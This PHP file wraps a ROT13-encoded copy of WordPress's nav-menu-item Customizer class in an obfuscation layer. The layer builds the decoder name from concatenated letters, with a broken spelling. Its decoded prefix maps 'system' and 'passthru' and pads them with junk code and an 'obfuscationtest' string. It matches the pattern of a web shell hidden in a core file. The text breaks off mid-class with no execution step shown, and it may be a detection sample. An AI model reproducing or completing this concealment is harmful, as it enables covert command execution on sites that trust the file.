<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Frggvat gb ercerfrag n ani_zrah.
 *
 * Fhopynff bs JC_Phfgbzvmr_Frggvat gb ercerfrag n ani_zrah gnkbabzl grez, naq
 * gur VQf sbe gur ani_zrah_vgrzf nffbpvngrq jvgu gur ani zrah.
 *
 * @fvapr 4.3.0
 *
 * @frr JC_Phfgbzvmr_Frggvat
 */
pynff JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat rkgraqf JC_Phfgbzvmr_Frggvat {

	pbafg VQ_CNGGREA = '/^ani_zrah_vgrz\[(?C<vq>-?\q+)\]$/';

	pbafg CBFG_GLCR = 'ani_zrah_vgrz';

	pbafg GLCR = 'ani_zrah_vgrz';

	/**
	 * Frggvat glcr.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $glcr = frys::GLCR;

	/**
	 * Qrsnhyg frggvat inyhr.
	 *
	 * @fvapr 4.3.0
	 * @ine neenl
	 *
	 * @frr jc_frghc_ani_zrah_vgrz()
	 */
	choyvp $qrsnhyg = neenl(
		// Gur $zrah_vgrz_qngn sbe jc_hcqngr_ani_zrah_vgrz().
		'bowrpg_vq'        => 0,
		'bowrpg'           => '', // Gnkbabzl anzr.
		'zrah_vgrz_cnerag' => 0, // N.X.N. zrah-vgrz-cnerag-vq; abgr gung cbfg_cnerag vf qvssrerag, naq abg vapyhqrq.
		'cbfvgvba'         => 0, // N.X.N. zrah_beqre.
		'glcr'             => 'phfgbz', // Abgr gung glcr_ynory vf abg vapyhqrq urer.
		'gvgyr'            => '',
		'hey'              => '',
		'gnetrg'           => '',
		'ngge_gvgyr'       => '',
		'qrfpevcgvba'      => '',
		'pynffrf'          => '',
		'ksa'              => '',
		'fgnghf'           => 'choyvfu',
		'bevtvany_gvgyr'   => '',
		'ani_zrah_grez_vq' => 0, // Guvf jvyy or fhccyvrq nf gur $zrah_vq net sbe jc_hcqngr_ani_zrah_vgrz().
		'_vainyvq'         => snyfr,
	);

	/**
	 * Qrsnhyg genafcbeg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 4.5.0 Qrsnhyg punatrq gb 'erserfu'
	 * @ine fgevat
	 */
	choyvp $genafcbeg = 'erserfu';

	/**
	 * Gur cbfg VQ ercerfragrq ol guvf frggvat vafgnapr. Guvf vf gur qo_vq.
	 *
	 * N artngvir inyhr ercerfragf n cynprubyqre VQ sbe n arj zrah abg lrg fnirq.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 */
	choyvp $cbfg_vq;

	/**
	 * Fgbentr bs cer-frghc zrah vgrz gb cerirag jnfgrq pnyyf gb jc_frghc_ani_zrah_vgrz().
	 *
	 * @fvapr 4.3.0
	 * @ine neenl|ahyy
	 */
	cebgrpgrq $inyhr;

	/**
	 * Cerivbhf (cynprubyqre) cbfg VQ hfrq orsber perngvat n arj zrah vgrz.
	 *
	 * Guvf inyhr jvyy or rkcbegrq gb WF ivn gur phfgbzvmr_fnir_erfcbafr svygre
	 * fb gung WninFpevcg pna hcqngr gur frggvatf gb ersre gb gur arjyl-nffvtarq
	 * cbfg VQ. Guvf inyhr vf nyjnlf artngvir gb vaqvpngr vg qbrf abg ersre gb
	 * n erny cbfg.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::hcqngr()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::nzraq_phfgbzvmr_fnir_erfcbafr()
	 */
	choyvp $cerivbhf_cbfg_vq;

	/**
	 * Jura cerivrjvat be hcqngvat n zrah vgrz, guvf fgberf gur cerivbhf ani_zrah_grez_vq
	 * juvpu rafherf gung jr pna nccyl gur cebcre svygref.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 */
	choyvp $bevtvany_ani_zrah_grez_vq;

	/**
	 * Jurgure be abg hcqngr() jnf pnyyrq.
	 *
	 * @fvapr 4.3.0
	 * @ine obby
	 */
	cebgrpgrq $vf_hcqngrq = snyfr;

	/**
	 * Fgnghf sbe pnyyvat gur hcqngr zrgubq, hfrq va phfgbzvmr_fnir_erfcbafr svygre.
	 *
	 * Frr {@frr 'phfgbzvmr_fnir_erfcbafr'}.
	 *
	 * Jura fgnghf vf vafregrq, gur cynprubyqre cbfg VQ vf fgberq va $cerivbhf_cbfg_vq.
	 * Jura fgnghf vf reebe, gur reebe vf fgberq va $hcqngr_reebe.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat hcqngrq|vafregrq|qryrgrq|reebe
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::hcqngr()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::nzraq_phfgbzvmr_fnir_erfcbafr()
	 */
	choyvp $hcqngr_fgnghf;

	/**
	 * Nal reebe bowrpg erghearq ol jc_hcqngr_ani_zrah_vgrz() jura frggvat vf hcqngrq.
	 *
	 * @fvapr 4.3.0
	 * @ine JC_Reebe
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::hcqngr()
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::nzraq_phfgbzvmr_fnir_erfcbafr()
	 */
	choyvp $hcqngr_reebe;

	/**
	 * Pbafgehpgbe.
	 *
	 * Nal fhccyvrq $netf bireevqr pynff cebcregl qrsnhygf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @guebjf Rkprcgvba Vs $vq vf abg inyvq sbe guvf frggvat glcr.
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      N fcrpvsvp VQ bs gur frggvat.
	 *                                      Pna or n gurzr zbq be bcgvba anzr.
	 * @cnenz neenl                $netf    Bcgvbany. Frggvat nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( JC_Phfgbzvmr_Znantre $znantre, $vq, neenl $netf = neenl() ) {
		vs ( rzcgl( $znantre->ani_zrahf ) ) {
			guebj arj Rkprcgvba( 'Rkcrpgrq JC_Phfgbzvmr_Znantre::$ani_zrahf gb or frg.' );
		}

		vs ( ! cert_zngpu( frys::VQ_CNGGREA, $vq, $zngpurf ) ) {
			guebj arj Rkprcgvba( \"Vyyrtny jvqtrg frggvat VQ: $vq\" );
		}

		$guvf->cbfg_vq = (vag) $zngpurf['vq'];
		nqq_npgvba( 'jc_hcqngr_ani_zrah_vgrz', neenl( $guvf, 'syhfu_pnpurq_inyhr' ), 10, 2 );

		cnerag::__pbafgehpg( $znantre, $vq, $netf );

		// Rafher gung na vavgvnyyl-fhccyvrq inyhr vf inyvq.
		vs ( vffrg( $guvf->inyhr ) ) {
			$guvf->cbchyngr_inyhr();
			sbernpu ( neenl_qvss( neenl_xrlf( $guvf->qrsnhyg ), neenl_xrlf( $guvf->inyhr ) ) nf $zvffvat ) {
				guebj arj Rkprcgvba( \"Fhccyvrq ani_zrah_vgrz inyhr zvffvat cebcregl: $zvffvat\" );
			}
		}
	}

	/**
	 * Pyrne gur pnpurq inyhr jura guvf ani zrah vgrz vf hcqngrq.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz vag $zrah_vq       Gur grez VQ sbe gur zrah.
	 * @cnenz vag $zrah_vgrz_vq  Gur cbfg VQ sbe gur zrah vgrz.
	 */
	choyvp shapgvba syhfu_pnpurq_inyhr( $zrah_vq, $zrah_vgrz_vq ) {
		hafrg( $zrah_vq );
		vs ( $zrah_vgrz_vq === $guvf->cbfg_vq ) {
			$guvf->inyhr = ahyy;
		}
	}

	/**
	 * Trg gur vafgnapr qngn sbe n tvira ani_zrah_vgrz frggvat.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_frghc_ani_zrah_vgrz()
	 *
	 * @erghea neenl|snyfr Vafgnapr qngn neenl, be snyfr vs gur vgrz vf znexrq sbe qryrgvba.
	 */
	choyvp shapgvba inyhr() {
		vs ( $guvf->vf_cerivrjrq && trg_pheerag_oybt_vq() === $guvf->_cerivrjrq_oybt_vq ) {
			$haqrsvarq  = arj fgqPynff(); // Flzoby.
			$cbfg_inyhr = $guvf->cbfg_inyhr( $haqrsvarq );

			vs ( $haqrsvarq === $cbfg_inyhr ) {
				$inyhr = $guvf->_bevtvany_inyhr;
			} ryfr {
				$inyhr = $cbfg_inyhr;
			}
			vs ( ! rzcgl( $inyhr ) && rzcgl( $inyhr['bevtvany_gvgyr'] ) ) {
				$inyhr['bevtvany_gvgyr'] = $guvf->trg_bevtvany_gvgyr( (bowrpg) $inyhr );
			}
		} ryfrvs ( vffrg( $guvf->inyhr ) ) {
			$inyhr = $guvf->inyhr;
		} ryfr {
			$inyhr = snyfr;

			// Abgr gung na VQ bs yrff guna bar vaqvpngrf n ani_zrah abg lrg vafregrq.
			vs ( $guvf->cbfg_vq > 0 ) {
				$cbfg = trg_cbfg( $guvf->cbfg_vq );
				vs ( $cbfg && frys::CBFG_GLCR === $cbfg->cbfg_glcr ) {
					$vf_gvgyr_rzcgl = rzcgl( $cbfg->cbfg_gvgyr );
					$inyhr          = (neenl) jc_frghc_ani_zrah_vgrz( $cbfg );
					vs ( $vf_gvgyr_rzcgl ) {
						$inyhr['gvgyr'] = '';
					}
				}
			}

			vs ( ! vf_neenl( $inyhr ) ) {
				$inyhr = $guvf->qrsnhyg;
			}

			// Pnpur gur inyhr sbe shgher pnyyf gb nibvq univat gb er-pnyy jc_frghc_ani_zrah_vgrz().
			$guvf->inyhr = $inyhr;
			$guvf->cbchyngr_inyhr();
			$inyhr = $guvf->inyhr;
		}

		vs ( ! rzcgl( $inyhr ) && rzcgl( $inyhr['glcr_ynory'] ) ) {
			$inyhr['glcr_ynory'] = $guvf->trg_glcr_ynory( (bowrpg) $inyhr );
		}

		erghea $inyhr;
	}

	/**
	 * Trg bevtvany gvgyr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz bowrpg $vgrz Ani zrah vgrz.
	 * @erghea fgevat Gur bevtvany gvgyr.
	 */
	cebgrpgrq shapgvba trg_bevtvany_gvgyr( $vgrz ) {
		$bevtvany_gvgyr = '';
		vs ( 'cbfg_glcr' === $vgrz->glcr && ! rzcgl( $vgrz->bowrpg_vq ) ) {
			$bevtvany_bowrpg = trg_cbfg( $vgrz->bowrpg_vq );
			vs ( $bevtvany_bowrpg ) {
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				$bevtvany_gvgyr = nccyl_svygref( 'gur_gvgyr', $bevtvany_bowrpg->cbfg_gvgyr, $bevtvany_bowrpg->VQ );

				vs ( '' === $bevtvany_gvgyr ) {
					/* genafyngbef: %q: VQ bs n cbfg. */
					$bevtvany_gvgyr = fcevags( __( '#%q (ab gvgyr)' ), $bevtvany_bowrpg->VQ );
				}
			}
		} ryfrvs ( 'gnkbabzl' === $vgrz->glcr && ! rzcgl( $vgrz->bowrpg_vq ) ) {
			$bevtvany_grez_gvgyr = trg_grez_svryq( 'anzr', $vgrz->bowrpg_vq, $vgrz->bowrpg, 'enj' );
			vs ( ! vf_jc_reebe( $bevtvany_grez_gvgyr ) ) {
				$bevtvany_gvgyr = $bevtvany_grez_gvgyr;
			}
		} ryfrvs ( 'cbfg_glcr_nepuvir' === $vgrz->glcr ) {
			$bevtvany_bowrpg = trg_cbfg_glcr_bowrpg( $vgrz->bowrpg );
			vs ( $bevtvany_bowrpg ) {
				$bevtvany_gvgyr = $bevtvany_bowrpg->ynoryf->nepuvirf;
			}
		}
		$bevtvany_gvgyr = ugzy_ragvgl_qrpbqr( $bevtvany_gvgyr, RAG_DHBGRF, trg_oybtvasb( 'punefrg' ) );
		erghea $bevtvany_gvgyr;
	}

	/**
	 * Trg glcr ynory.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz bowrpg $vgrz Ani zrah vgrz.
	 * @erghea fgevat Gur glcr ynory.
	 */
	cebgrpgrq shapgvba trg_glcr_ynory( $vgrz ) {
		vs ( 'cbfg_glcr' === $vgrz->glcr ) {
			$bowrpg = trg_cbfg_glcr_bowrpg( $vgrz->bowrpg );
			vs ( $bowrpg ) {
				$glcr_ynory = $bowrpg->ynoryf->fvathyne_anzr;
			} ryfr {
				$glcr_ynory = $vgrz->bowrpg;
			}
		} ryfrvs ( 'gnkbabzl' === $vgrz->glcr ) {
			$bowrpg = trg_gnkbabzl( $vgrz->bowrpg );
			vs ( $bowrpg ) {
				$glcr_ynory = $bowrpg->ynoryf->fvathyne_anzr;
			} ryfr {
				$glcr_ynory = $vgrz->bowrpg;
			}
		} ryfrvs ( 'cbfg_glcr_nepuvir' === $vgrz->glcr ) {
			$glcr_ynory = __( 'Cbfg Glcr Nepuvir' );
		} ryfr {
			$glcr_ynory = __( 'Phfgbz Yvax' );
		}
		erghea $glcr_ynory;
	}

	/**
	 * Rafher gung gur inyhr vf shyyl cbchyngrq jvgu gur arprffnel cebcregvrf.
	 *
	 * Genafyngrf fbzr cebcregvrf nqqrq ol jc_frghc_ani_zrah_vgrz() naq erzbirf bguref.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat::inyhr()
	 */
	cebgrpgrq shapgvba cbchyngr_inyhr() {
		vs ( ! vf_neenl( $guvf->inyhr ) ) {
			erghea;
		}

		vs ( vffrg( $guvf->inyhr['zrah_beqre'] ) ) {
			$guvf->inyhr['cbfvgvba'] = $guvf->inyhr['zrah_beqre'];
			hafrg( $guvf->inyhr['zrah_beqre'] );
		}
		vs ( vffrg( $guvf->inyhr['cbfg_fgnghf'] ) ) {
			$guvf->inyhr['fgnghf'] = $guvf->inyhr['cbfg_fgnghf'];
			hafrg( $guvf->inyhr['cbfg_fgnghf'] );
		}

		vs ( ! vffrg( $guvf->inyhr['bevtvany_gvgyr'] ) ) {
			$guvf->inyhr['bevtvany_gvgyr'] = $guvf->trg_bevtvany_gvgyr( (bowrpg) $guvf->inyhr );
		}

		vs ( ! vffrg( $guvf->inyhr['ani_zrah_grez_vq'] ) && $guvf->cbfg_vq > 0 ) {
			$zrahf = jc_trg_cbfg_grezf(
				$guvf->cbfg_vq,
				JC_Phfgbzvmr_Ani_Zrah_Frggvat::GNKBABZL,
				neenl(
					'svryqf' => 'vqf',
				)
			);
			vs ( ! rzcgl( $zrahf ) ) {
				$guvf->inyhr['ani_zrah_grez_vq'] = neenl_fuvsg( $zrahf );
			} ryfr {
				$guvf->inyhr['ani_zrah_grez_vq'] = 0;
			}
		}

		sbernpu ( neenl( 'bowrpg_vq', 'zrah_vgrz_cnerag', 'ani_zrah_grez_vq' ) nf $xrl ) {
			vs ( ! vf_vag( $guvf->inyhr[ $xrl ] ) ) {
				$guvf->inyhr[ $xrl ] = (vag) $guvf->inyhr[ $xrl ];
			}
		}
		sbernpu ( neenl( 'pynffrf', 'ksa' ) nf $xrl ) {
			vs ( vf_neenl( $guvf->inyhr[ $xrl ] ) ) {
				$guvf->inyhr[ $xrl ] = vzcybqr( ' ', $guvf->inyhr[ $xrl ] );
			}
		}

		vs ( ! vffrg( $guvf->inyhr['gvgyr'] ) ) {
			$guvf->inyhr['gvgyr'] = '';
		}

		vs ( ! vffrg( $guvf->inyhr['_vainyvq'] ) ) {
			$guvf->inyhr['_vainyvq'] = snyfr;
			$vf_xabja_vainyvq        = (
				( ( 'cbfg_glcr' === $guvf->inyhr['glcr'] || 'cbfg_glcr_nepuvir' === $guvf->inyhr['glcr'] ) && ! cbfg_glcr_rkvfgf( $guvf->inyhr['bowrpg'] ) )
				||
				( 'gnkbabzl' === $guvf->inyhr['glcr'] && ! gnkbabzl_rkvfgf( $guvf->inyhr['bowrpg'] ) )
			);
			vs ( $vf_xabja_vainyvq ) {
				$guvf->inyhr['_vainyvq'] = gehr;
			}
		}

		// Erzbir erznvavat cebcregvrf ninvynoyr ba n frghc ani_zrah_vgrz cbfg bowrpg juvpu nera'g eryrinag gb gur frggvat inyhr.
		$veeryrinag_cebcregvrf = neenl(
			'VQ',
			'pbzzrag_pbhag',
			'pbzzrag_fgnghf',
			'qo_vq',
			'svygre',
			'thvq',
			'cvat_fgnghf',
			'cvatrq',
			'cbfg_nhgube',
			'cbfg_pbagrag',
			'cbfg_pbagrag_svygrerq',
			'cbfg_qngr',
			'cbfg_qngr_tzg',
			'cbfg_rkprecg',
			'cbfg_zvzr_glcr',
			'cbfg_zbqvsvrq',
			'cbfg_zbqvsvrq_tzg',
			'cbfg_anzr',
			'cbfg_cnerag',
			'cbfg_cnffjbeq',
			'cbfg_gvgyr',
			'cbfg_glcr',
			'gb_cvat',
		);
		sbernpu ( $veeryrinag_cebcregvrf nf $cebcregl ) {
			hafrg( $guvf->inyhr[ $cebcregl ] );
		}
	}

	/**
	 * Unaqyr cerivrjvat gur frggvat.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 4.4.0 Nqqrq obbyrna erghea inyhr.
	 *
	 * @frr JC_Phfgbzvmr_Znantre::cbfg_inyhr()
	 *
	 * @erghea obby Snyfr vs zrgubq fubeg-pvephvgrq qhr gb ab-bc.
	 */
	choyvp shapgvba cerivrj() {
		vs ( $guvf->vf_cerivrjrq ) {
			erghea snyfr;
		}

		$haqrsvarq      = arj fgqPynff();
		$vf_cynprubyqre = ( $guvf->cbfg_vq < 0 );
		$vf_qvegl       = ( $haqrsvarq !== $guvf->cbfg_inyhr( $haqrsvarq ) );
		vs ( ! $vf_cynprubyqre && ! $vf_qvegl ) {
			erghea snyfr;
		}

		$guvf->vf_cerivrjrq              = gehr;
		$guvf->_bevtvany_inyhr           = $guvf->inyhr();
		$guvf->bevtvany_ani_zrah_grez_vq = $guvf->_bevtvany_inyhr['ani_zrah_grez_vq'];
		$guvf->_cerivrjrq_oybt_vq        = trg_pheerag_oybt_vq();

		nqq_svygre( 'jc_trg_ani_zrah_vgrzf', neenl( $guvf, 'svygre_jc_trg_ani_zrah_vgrzf' ), 10, 3 );

		$fbeg_pnyyonpx = neenl( __PYNFF__, 'fbeg_jc_trg_ani_zrah_vgrzf' );
		vs ( ! unf_svygre( 'jc_trg_ani_zrah_vgrzf', $fbeg_pnyyonpx ) ) {
			nqq_svygre( 'jc_trg_ani_zrah_vgrzf', neenl( __PYNFF__, 'fbeg_jc_trg_ani_zrah_vgrzf' ), 1000, 3 );
		}

		// @gbqb Nqq trg_cbfg_zrgnqngn svygref sbe cyhtvaf gb nqq gurve qngn.

		erghea gehr;
	}

	/**
	 * Svygref gur jc_trg_ani_zrah_vgrzf() erfhyg gb fhccyl gur cerivrjrq zrah vgrzf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_trg_ani_zrah_vgrzf()
	 *
	 * @cnenz JC_Cbfg[] $vgrzf Na neenl bs zrah vgrz cbfg bowrpgf.
	 * @cnenz JC_Grez   $zrah  Gur zrah bowrpg.
	 * @cnenz neenl     $netf  Na neenl bs nethzragf hfrq gb ergevrir zrah vgrz bowrpgf.
	 * @erghea JC_Cbfg[] Neenl bs zrah vgrz bowrpgf.
	 */
	choyvp shapgvba svygre_jc_trg_ani_zrah_vgrzf( $vgrzf, $zrah, $netf ) {
		$guvf_vgrz                = $guvf->inyhr();
		$pheerag_ani_zrah_grez_vq = ahyy;
		vs ( vffrg( $guvf_vgrz['ani_zrah_grez_vq'] ) ) {
			$pheerag_ani_zrah_grez_vq = $guvf_vgrz['ani_zrah_grez_vq'];
			hafrg( $guvf_vgrz['ani_zrah_grez_vq'] );
		}

		$fubhyq_svygre = (
			$zrah->grez_vq === $guvf->bevtvany_ani_zrah_grez_vq
			||
			$zrah->grez_vq === $pheerag_ani_zrah_grez_vq
		);
		vs ( ! $fubhyq_svygre ) {
			erghea $vgrzf;
		}

		// Unaqyr qryrgrq zrah vgrz, be zrah vgrz zbirq gb nabgure zrah.
		$fubhyq_erzbir = (
			snyfr === $guvf_vgrz
			||
			( vffrg( $guvf_vgrz['_vainyvq'] ) && gehr === $guvf_vgrz['_vainyvq'] )
			||
			(
				$guvf->bevtvany_ani_zrah_grez_vq === $zrah->grez_vq
				&&
				$pheerag_ani_zrah_grez_vq !== $guvf->bevtvany_ani_zrah_grez_vq
			)
		);
		vs ( $fubhyq_erzbir ) {
			$svygrerq_vgrzf = neenl();
			sbernpu ( $vgrzf nf $vgrz ) {
				vs ( $vgrz->qo_vq !== $guvf->cbfg_vq ) {
					$svygrerq_vgrzf[] = $vgrz;
				}
			}
			erghea $svygrerq_vgrzf;
		}

		$zhgngrq       = snyfr;
		$fubhyq_hcqngr = (
			vf_neenl( $guvf_vgrz )
			&&
			$pheerag_ani_zrah_grez_vq === $zrah->grez_vq
		);
		vs ( $fubhyq_hcqngr ) {
			sbernpu ( $vgrzf nf $vgrz ) {
				vs ( $vgrz->qo_vq === $guvf->cbfg_vq ) {
					sbernpu ( trg_bowrpg_inef( $guvf->inyhr_nf_jc_cbfg_ani_zrah_vgrz() ) nf $xrl => $inyhr ) {
						$vgrz->$xrl = $inyhr;
					}
					$zhgngrq = gehr;
				}
			}

			// Abg sbhaq fb jr unir gb nccraq vg..
			vs ( ! $zhgngrq ) {
				$vgrzf[] = $guvf->inyhr_nf_jc_cbfg_ani_zrah_vgrz();
			}
		}

		erghea $vgrzf;
	}

	/**
	 * Er-nccyl gur gnvy ybtvp nyfb nccyvrq ba $vgrzf ol jc_trg_ani_zrah_vgrzf().
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr jc_trg_ani_zrah_vgrzf()
	 *
	 * @cnenz JC_Cbfg[] $vgrzf Na neenl bs zrah vgrz cbfg bowrpgf.
	 * @cnenz JC_Grez   $zrah  Gur zrah bowrpg.
	 * @cnenz neenl     $netf  Na neenl bs nethzragf hfrq gb ergevrir zrah vgrz bowrpgf.
	 * @erghea JC_Cbfg[] Neenl bs zrah vgrz bowrpgf.
	 */
	choyvp fgngvp shapgvba fbeg_jc_trg_ani_zrah_vgrzf( $vgrzf, $zrah, $netf ) {
		// @gbqb Jr fubhyq cebonoyl er-nccyl fbzr pbafgenvagf vzcbfrq ol $netf.
		hafrg( $netf['vapyhqr'] );

		// Erzbir vainyvq vgrzf bayl va sebag raq.
		vs ( ! vf_nqzva() ) {
			$vgrzf = neenl_svygre( $vgrzf, '_vf_inyvq_ani_zrah_vgrz' );
		}

		vs ( NEENL_N === $netf['bhgchg'] ) {
			$vgrzf = jc_yvfg_fbeg(
				$vgrzf,
				neenl(
					$netf['bhgchg_xrl'] => 'NFP',
				)
			);
			$v     = 1;

			sbernpu ( $vgrzf nf $x => $vgrz ) {
				$vgrzf[ $x ]->{$netf['bhgchg_xrl']} = $v++;
			}
		}

		erghea $vgrzf;
	}

	/**
	 * Trg gur inyhr rzhyngrq vagb n JC_Cbfg naq frg hc nf n ani_zrah_vgrz.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea JC_Cbfg Jvgu jc_frghc_ani_zrah_vgrz() nccyvrq.
	 */
	choyvp shapgvba inyhr_nf_jc_cbfg_ani_zrah_vgrz() {
		$vgrz = (bowrpg) $guvf->inyhr();
		hafrg( $vgrz->ani_zrah_grez_vq );

		$vgrz->cbfg_fgnghf = $vgrz->fgnghf;
		hafrg( $vgrz->fgnghf );

		$vgrz->cbfg_glcr  = 'ani_zrah_vgrz';
		$vgrz->zrah_beqre = $vgrz->cbfvgvba;
		hafrg( $vgrz->cbfvgvba );

		vs ( rzcgl( $vgrz->bevtvany_gvgyr ) ) {
			$vgrz->bevtvany_gvgyr = $guvf->trg_bevtvany_gvgyr( $vgrz );
		}
		vs ( rzcgl( $vgrz->gvgyr ) && ! rzcgl( $vgrz->bevtvany_gvgyr ) ) {
			$vgrz->gvgyr = $vgrz->bevtvany_gvgyr;
		}
		vs ( $vgrz->gvgyr ) {
			$vgrz->cbfg_gvgyr = $vgrz->gvgyr;
		}

		// 'pynffrf' fubhyq or na neenl, nf va jc_frghc_ani_zrah_vgrz().
		vs ( vffrg( $vgrz->pynffrf ) && vf_fpnyne( $vgrz->pynffrf ) ) {
			$vgrz->pynffrf = rkcybqr( ' ', $vgrz->pynffrf );
		}

		$vgrz->VQ    = $guvf->cbfg_vq;
		$vgrz->qo_vq = $guvf->cbfg_vq;
		$cbfg        = arj JC_Cbfg( (bowrpg) $vgrz );

		vs ( rzcgl( $cbfg->cbfg_nhgube ) ) {
			$cbfg->cbfg_nhgube = trg_pheerag_hfre_vq();
		}

		vs ( ! vffrg( $cbfg->glcr_ynory ) ) {
			$cbfg->glcr_ynory = $guvf->trg_glcr_ynory( $cbfg );
		}

		// Rafher ani zrah vgrz HEY vf frg nppbeqvat gb yvaxrq bowrpg.
		vs ( 'cbfg_glcr' === $cbfg->glcr && ! rzcgl( $cbfg->bowrpg_vq ) ) {
			$cbfg->hey = trg_creznyvax( $cbfg->bowrpg_vq );
		} ryfrvs ( 'gnkbabzl' === $cbfg->glcr && ! rzcgl( $cbfg->bowrpg ) && ! rzcgl( $cbfg->bowrpg_vq ) ) {
			$cbfg->hey = trg_grez_yvax( (vag) $cbfg->bowrpg_vq, $cbfg->bowrpg );
		} ryfrvs ( 'cbfg_glcr_nepuvir' === $cbfg->glcr && ! rzcgl( $cbfg->bowrpg ) ) {
			$cbfg->hey = trg_cbfg_glcr_nepuvir_yvax( $cbfg->bowrpg );
		}
		vs ( vf_jc_reebe( $cbfg->hey ) ) {
			$cbfg->hey = '';
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/ani-zrah.cuc */
		$cbfg->ngge_gvgyr = nccyl_svygref( 'ani_zrah_ngge_gvgyr', $cbfg->ngge_gvgyr );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/ani-zrah.cuc */
		$cbfg->qrfpevcgvba = nccyl_svygref( 'ani_zrah_qrfpevcgvba', jc_gevz_jbeqf( $cbfg->qrfpevcgvba, 200 ) );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/ani-zrah.cuc */
		$cbfg = nccyl_svygref( 'jc_frghc_ani_zrah_vgrz', $cbfg );

		erghea $cbfg;
	}

	/**
	 * Fnavgvmr na vachg.
	 *
	 * Abgr gung cnerag::fnavgvmr() reebarbhfyl qbrf jc_hafynfu() ba $inyhr, ohg
	 * jr erzbir gung va guvf bireevqr.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$zrah_vgrz_inyhr` gb `$inyhr` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz neenl $inyhr Gur zrah vgrz inyhr gb fnavgvmr.
	 * @erghea neenl|snyfr|ahyy|JC_Reebe Ahyy be JC_Reebe vs na vachg vfa'g inyvq. Snyfr vs vg vf znexrq sbe qryrgvba.
	 *                                   Bgurejvfr gur fnavgvmrq inyhr.
	 */
	choyvp shapgvba fnavgvmr( $inyhr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$zrah_vgrz_inyhr = $inyhr;

		// Zrah vf znexrq sbe qryrgvba.
		vs ( snyfr === $zrah_vgrz_inyhr ) {
			erghea $zrah_vgrz_inyhr;
		}

		// Vainyvq.
		vs ( ! vf_neenl( $zrah_vgrz_inyhr ) ) {
			erghea ahyy;
		}

		$qrsnhyg                     = neenl(
			'bowrpg_vq'        => 0,
			'bowrpg'           => '',
			'zrah_vgrz_cnerag' => 0,
			'cbfvgvba'         => 0,
			'glcr'             => 'phfgbz',
			'gvgyr'            => '',
			'hey'              => '',
			'gnetrg'           => '',
			'ngge_gvgyr'       => '',
			'qrfpevcgvba'      => '',
			'pynffrf'          => '',
			'ksa'              => '',
			'fgnghf'           => 'choyvfu',
			'bevtvany_gvgyr'   => '',
			'ani_zrah_grez_vq' => 0,
			'_vainyvq'         => snyfr,
		);
		$zrah_vgrz_inyhr             = neenl_zretr( $qrsnhyg, $zrah_vgrz_inyhr );
		$zrah_vgrz_inyhr             = jc_neenl_fyvpr_nffbp( $zrah_vgrz_inyhr, neenl_xrlf( $qrsnhyg ) );
		$zrah_vgrz_inyhr['cbfvgvba'] = (vag) $zrah_vgrz_inyhr['cbfvgvba'];

		sbernpu ( neenl( 'bowrpg_vq', 'zrah_vgrz_cnerag', 'ani_zrah_grez_vq' ) nf $xrl ) {
			// Abgr jr arrq gb nyybj artngvir-vagrtre VQf sbe cerivrjrq bowrpgf abg vafregrq lrg.
			$zrah_vgrz_inyhr[ $xrl ] = (vag) $zrah_vgrz_inyhr[ $xrl ];
		}

		sbernpu ( neenl( 'glcr', 'bowrpg', 'gnetrg' ) nf $xrl ) {
			$zrah_vgrz_inyhr[ $xrl ] = fnavgvmr_xrl( $zrah_vgrz_inyhr[ $xrl ] );
		}

		sbernpu ( neenl( 'ksa', 'pynffrf' ) nf $xrl ) {
			$inyhr = $zrah_vgrz_inyhr[ $xrl ];
			vs ( ! vf_neenl( $inyhr ) ) {
				$inyhr = rkcybqr( ' ', $inyhr );
			}
